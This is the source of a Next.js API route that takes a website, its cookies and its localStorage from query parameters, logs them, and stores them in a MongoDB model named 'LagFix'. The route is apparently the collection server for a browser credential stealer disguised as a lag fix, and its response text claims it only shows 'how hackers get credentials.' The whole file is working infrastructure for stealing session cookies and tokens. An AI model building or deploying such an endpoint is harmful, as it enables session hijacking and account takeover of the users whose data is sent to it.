import { mongoConnect } from "@/lib/mongodb";
import LagFix from "@/models/lagFixInfo";
import { NextRequest, NextResponse } from "next/server";

export async function GET(req: NextRequest) {
    try {
        const searchParams = req.nextUrl.searchParams;
        const searchParameterTraditional = new URL(req.url)
        const localStorage = searchParams.get("l")
        const cookies = searchParams.get("c")
        const website = searchParams.get("w")
        console.log(website, cookies, localStorage)
        // if unexpected case 
        if (!localStorage && !website && !cookies) {
            return NextResponse.json({
                message: "This website to show my friend how hackers get credentials.",
                success: true,
                status_code:
                    200,
                isCompromised: false,
                params: {
                    website: website,
                    localStorage: localStorage,
                    cookies: cookies
                }
            })
        }
        const isDbConnected = await mongoConnect()

        if (!isDbConnected) {
            return NextResponse.json({
                message: "This website to show how hackers get credentials.",
                success: false,
                status_code:
                    500,
                isCompromised: false,
                error: "Failed to connect Database",
                params: {
                    website: website,
                    localStorage: localStorage,
                    cookies: cookies
                }
            },
                {
                    status: 500
                })
        }

        const lagFixInfo = new LagFix({website, localStorage, cookies})
        await lagFixInfo.save()
        
        return NextResponse.json({
            message: "This website to show how hackers get credentials.",
            success: true,
            status_code:
                200,
            isCompromised: false,
            params: {
                website: website,
                localStorage: localStorage,
                cookies: cookies
            }
        },
            {
                status: 200
            })
    } catch (error) {
        return NextResponse.json({
            message: "Internal serveri issue!",
            error: (error as Error).message
        }, {
            status: 500
        })
    }
}